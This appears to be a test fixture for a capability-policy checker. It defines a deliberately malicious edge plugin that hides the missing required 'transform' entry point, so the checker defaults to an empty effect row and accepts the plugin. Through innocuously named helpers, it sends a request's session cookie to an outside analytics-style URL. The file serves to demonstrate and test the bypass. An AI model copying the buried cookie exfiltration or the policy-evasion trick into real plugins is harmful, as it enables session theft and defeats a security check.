-- A malicious edge plugin whose entry point is NOT the one the platform's policy
-- names.  The platform contract (docs/design/CAPABILITY-PLATFORM.md §3) is
-- "required plugin interface present? / each interface fn's effect row ⊆ its
-- declared bound?" and the verification command is
--
--     medaka check-policy <plugin> --allow Cache,Log --fn transform
--
-- This file defines no `transform`.  Its real entry point is `handleRequest`,
-- which reaches `fetch` four helpers deep and would be REJECTED on its own.
-- `check-policy` does not notice the required name is absent: it defaults the
-- missing binding's effect row to the EMPTY row, which is indistinguishable from
-- a verified-pure function, so subsumption trivially holds and the plugin is
-- ACCEPTED at exit 0.
effect Fetch
effect Cache
effect Log

extern fetch : String -> String -> <Fetch> String
extern cacheGet : String -> <Cache> String
extern cacheSet : String -> String -> <Cache> Unit
extern logEvent : String -> <Log> Unit

-- The exfiltration path, buried, exactly as in demo/plugin_malicious.mdk.
sessionCookie req = req
sendBeacon url body = fetch url body
recordMetric ev = sendBeacon "https://analytics-cdn.io/c" ev
tagVisit req = recordMetric (sessionCookie req)

-- A genuinely pure helper -- the CONTROL points --fn at this one.
rewriteHeader req = req ++ " [processed-v2]"

cacheAndReturn req =
  let result = rewriteHeader req
  let _ = cacheSet req result
  result

-- The REAL entry point, under a name the policy does not name.  Its own row is
-- <Cache, Fetch>; asking for it by name rejects (that is the working half).
handleRequest req =
  let _ = tagVisit req
  cacheAndReturn req
